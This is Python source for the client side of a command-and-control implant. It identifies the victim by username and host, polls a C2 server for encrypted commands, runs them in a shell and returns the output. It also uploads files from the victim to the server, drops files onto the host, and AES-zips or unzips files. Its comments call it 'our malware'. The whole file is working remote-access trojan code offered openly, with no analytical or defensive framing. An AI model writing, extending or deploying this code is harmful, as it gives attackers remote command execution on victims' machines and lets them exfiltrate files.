"""
Command & Control Client Side Coding
Author: Davood Yahay(D.Yakuza)
"""
# Import os methods based on OS, use platform.system() to detect OS
from platform import system

if system() == "Windows":
    from os import getenv, chdir, path, getcwd
elif system() == "Linux":
    from os import getenv, uname, chdir, path, getcwd

# Import for both Linux & Windows Builds
from requests import get, exceptions, post, put
from colorama import Fore
from time import time, sleep
from subprocess import run, PIPE, STDOUT
from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
from encryption import cipher
# Settings Variables(Constants) Importing
from settings import (CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
                      C2_SERVER, DELAY, PORT, PROXY, HEADERS, FILE_SEND, ZIP_PASSWORD, INCOMING)

# If Client have Windows OS
if system() == "Windows":
    # For Windows obtain a unique identifying Information
    client = (getenv("USERNAME", "Unknown-Username") + "@" +
              getenv("COMPUTERNAME", "Unknown-Computer Name") + "@" + str(time()))

# Elif Client have Linux OS
elif system() == "Linux":
    # For Linux, get a unique identifying Information
    client = getenv("LOGNAME", "Unknown-Username") + "@" + uname().nodename + "@" + str(time())

# If OS is not windows or linux, use a Linux version of the client
else:
    client = getenv("LOGNAME", "Unknown-Username") + "@" + uname().nodename + "@" + str(time())

encryptedClient = cipher.encrypt(client.encode()).decode()

# Print C2 Client Side Message for avoid complexing in test operation
print(Fore.LIGHTMAGENTA_EX + "\n[+]-------------C2 Client Side-------------[+]" + Fore.RESET)


def post_to_server(message: str, response_path=RESPONSE):
    """function to post data to C2 Server, accept message and response path
	optional as arguments"""
    try:
        # Byte encoding message and then encrypt it before POSTING
        message = cipher.encrypt(message.encode())

        # Post encoded encrypted message to Server via response_path address
        post(f"http://{C2_SERVER}:{PORT}{response_path}",
             data={RESPONSE_KEY: message},
             headers=HEADERS, proxies=PROXY)

    except exceptions.RequestException:
        return

"""this is a function that split string and returns third item.
by default, all forwarded slashes in the third item Changed to backslashes
this can be disabled, if replace set on False during call function. """
def get_filename(input_string):
    try:
        return " ".join(input_string.split()[2:]).replace("\\","/")
    # If the path of the file doesn't enter correctly, notify us on the server
    except IndexError:
        post_to_server(f"You must enter Argument after {input_string}. \n")


# Better use infinity loop when add control active sessions feature in Server Side
while True:
    '''Try an http get requests to the C2 Server and retrieve command;
	if failed, Keep Trying forever.'''
    try:
        response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encryptedClient}", headers=HEADERS, proxies=PROXY)

        # if we got 404 status codes, raise an exception to jump to except block
        if response.status_code == 404:
            raise exceptions.RequestException

    except exceptions.RequestException:
        # print(Fore.LIGHTRED_EX+"[-] C2 Server is down, try Reconnecting..."+Fore.RESET)
        try:
            sleep(DELAY)
            continue  # jump to the last iteration of the loop(while True:)
        except KeyboardInterrupt:
            print(Fore.LIGHTMAGENTA_EX + "\n[*] User has been Interrupted the C2 Client Side" + Fore.RESET)
            exit()
    except KeyboardInterrupt:
        print(Fore.LIGHTMAGENTA_EX + "\n[*] User has been Interrupted the C2 Client Side" + Fore.RESET)
        exit()
    except Exception as e:
        print(Fore.LIGHTYELLOW_EX + "\n[!] Unknown Error when Sending Request to C2 Server" + Fore.RESET)
        print(f'Error Content: {e}')
        exit()

    # Retrieve the command from response and decode it 
    command = cipher.decrypt(response.content).decode()

    # Check if the command is cd without any input path, change to home directory
    if len(command) == 2 and command == "cd":
        homeDirectory = path.expanduser("~")
        chdir(homeDirectory)
        post_to_server(homeDirectory, CWD_RESPONSE)

    # if the Command is cd follow below blocks, first check cd with an input path
    elif command.startswith("cd "):
        # Splicing the command to remove the cd and the extract directory path
        directory = command[3:]

        # Try to Change Directory and handle the error if it occurs
        try:
            chdir(directory)
        except FileNotFoundError:
            post_to_server(f"No such directory {directory}.\n")
        except NotADirectoryError:
            post_to_server(f"{directory} is not a directory")
        except PermissionError:
            post_to_server(f"You have don't Permission to Access{directory}.\n")
        except OSError:
            post_to_server("There was a OS Error on client.\n")
        # If not error, send the current directory to the server for using in Prompt
        else:
            post_to_server(getcwd(), CWD_RESPONSE)

    # Run command using subprocess.run module
    elif not command.startswith("client "):
        # Run the command and get the output
        commandOutput = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
        # Send the output to the server, must be decoding it first because subprocess.run() return bytes
        post_to_server(commandOutput.decode())

    # The client download FILENAME command allows us to transfer a file to the client from our C2 Server,
    # Actually Client download from our C2 server, in below elif block Handle the download command
    elif command.startswith("client download"):
        # Split out the filepath to download, and replace \ with /
        filepath = get_filename(command)

        # If we got IndexError, start a new iteration of the wile loop
        if filepath is None:
            continue

        # Return the basename(filename) from filepath
        filename = path.basename(filepath)

        # UTF-8 Encode the file to be able to be encrypting it, but then we must decode it after the encryption.
        encryptedFilepath = cipher.encrypt(filepath.encode()).decode()

        # Use and HTTP GET request to stream the requested file from c2 server
        try:
            with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encryptedFilepath}", stream=True,
                     headers=HEADERS, proxies=PROXY) as response:

                # If the file was not found, open it up and write it out to disk, then notify us on the server
                if response.status_code == 200:
                    # Open the file and write the contents of the response to it
                    with open(filename, "wb") as fileHandle:
                        # Decrypt the Response content and write the file out to the Disk, then Notify us on Server
                        fileHandle.write(cipher.decrypt(response.content))

                    # Notify us on the server that the file was downloaded
                    post_to_server(f"\n[+] Client: {filename} is now Written in {filepath} on {client}.\n")

        # Exception Handling Common Errors maybe occurs
        except FileNotFoundError:
            # noinspection PyUnboundLocalVariable
            post_to_server(f"{filepath} is not found on the {client}.\n")
        except PermissionError:
            post_to_server(f"You don't have permission to download {filepath} on the {client}.\n")
        except OSError:
            post_to_server(f"Unable to Access {filepath} on the {client}, OS Error.\n")


    # The client upload FILENAME command allows us to transfer a file to the c2 server from our connected client,
    # Actually Client can Upload a file to server
    elif command.startswith("client upload"):

        # Split out the filepath to download, and replace \ with /
        filepath = get_filename(command)

        # If we got IndexError, start a new iteration of the wile loop
        if filepath is None:
            continue

        # Return the basename(filename) from filepath
        filename = path.basename(filepath)

        # UTF-8 Encode the file to be able to be encrypting it, but then we must decode it after the encryption.
        encryptedFilename = cipher.encrypt(filename.encode()).decode()

        # Read the file and use it as data argument for an HTTP PUT Request to our C2 Server
        try:
            with open(filepath, "rb") as fileHandle:
                encryptedFile = cipher.encrypt(fileHandle.read())
                put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encryptedFilename}", data=encryptedFile, stream=True,
                    headers=HEADERS, proxies=PROXY)

            # Notify us on the server that the file was downloaded
            post_to_server(f"[+] Client: {filename} is now Uploaded to {INCOMING}/{filename} on the {client}.\n")

        # Exception Handling Common Errors maybe occurs
        except FileNotFoundError:
            post_to_server(f"{filepath} is not found on the {client}.\n")
        except PermissionError:
            post_to_server(f"You don't have permission to Upload {filepath} from the {client}.\n")
        except OSError:
            post_to_server(f"Unable to Access {filepath} on the {client}, OS Error.\n")

    elif command.startswith("client zip"):
        # Split out the filepath to download, and replace \ with /
        filepath = get_filename(command)

        # If we got IndexError, start a new iteration of the wile loop
        if filepath is None:
            continue

        # Return the basename(filename) from filepath
        filename = path.basename(filepath)

        # ZIP file using AES Encryption and LZMA compression method
        try:
            with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zipFile:
                zipFile.setpassword(ZIP_PASSWORD)

                # We have functionality to zip-encrypt files, no directory yet
                if path.isdir(filepath):
                    post_to_server(f"{filepath} on {client} is a directory. only Files can be zip-encrypted. \n")
                else:
                    zipFile.write(filepath, arcname=filename)
                    post_to_server(f"{filename}.zip is now Zipped and Encrypted in {filepath}.zip on the client. \n")

        except FileNotFoundError:
            post_to_server(f"{filepath} is not found on the {client}.\n")
        except PermissionError:
            post_to_server(f"You don't have permission to zip-encrypt {filepath} on the {client}.\n")
        except OSError:
            post_to_server(f"Unable to Access {filepath} on the {client}, OS Error.\n")


    # the 'client unzip FILE' command allows us to Unzip-Decrypt files on the client
    elif command.startswith("client unzip"):
        # Split out the filepath to download, and replace \ with /
        filepath = get_filename(command)

        # If we got IndexError, start a new iteration of the wile loop
        if filepath is None:
            continue

        # Return the basename(filename) from filepath
        filename = path.basename(filepath)

        # Unzip AES Encrypted file using pyzipper
        try:
            with AESZipFile(filepath) as zipFile:
                zipFile.setpassword(ZIP_PASSWORD)
                zipFile.extractall(path.dirname(filepath))
                post_to_server(f"{filename} is now Unzipped and Decrypted in {filepath} on the client. \n")
        # Handle Errors maybe Occurs
        except FileNotFoundError:
            post_to_server(f"{filepath} is not found on the {client}.\n")
        except PermissionError:
            post_to_server(f"You don't have permission to Unzip-Decrypt {filepath} on the {client}.\n")
        except OSError:
            post_to_server(f"Unable to Access {filepath} on the {client}, OS Error.\n")



    # the client Kill Command shutdown our malware
    elif command.startswith("client kill"):
        post_to_server(f"{client} has been Killed. \n")
        exit()
    # the client sleep SECOND command will sleep the client for number of seconds
    elif command.startswith("client sleep "):
        # Slicing the command to remove the client sleep and the extract delay
        try:
            delay = float(command.split()[2])
            # if delay under zero raise ValueError
            if delay < 0:
                raise ValueError
        # Handle ValueError & IndexError Exceptions
        except (IndexError, ValueError):
            post_to_server("You must Enter a Positive Number for Sleep Delay in Seconds.\n")

        # if No Excepts happens, sleep the client for the delay seconds and send a message to the server
        else:
            post_to_server(f"{client} go to Sleep for {delay} seconds.\n")
            sleep(delay)
            # After sleep, client awake and then send a client awake message to the server
            post_to_server(f"{client} is now Awake.\n")

    else:
        post_to_server("Wrong/Unknown Input!!! Not a Built-in Command or Shell Command. try again... \n")

    print("[+] Command Executed and Result send to C2 Server.")
    print(Fore.LIGHTBLUE_EX + str(response.status_code) + Fore.RESET)

print(Fore.LIGHTCYAN_EX + f"[+] Goodbye & Goodluck Ninja 🥷\n{client}" + Fore.RESET)
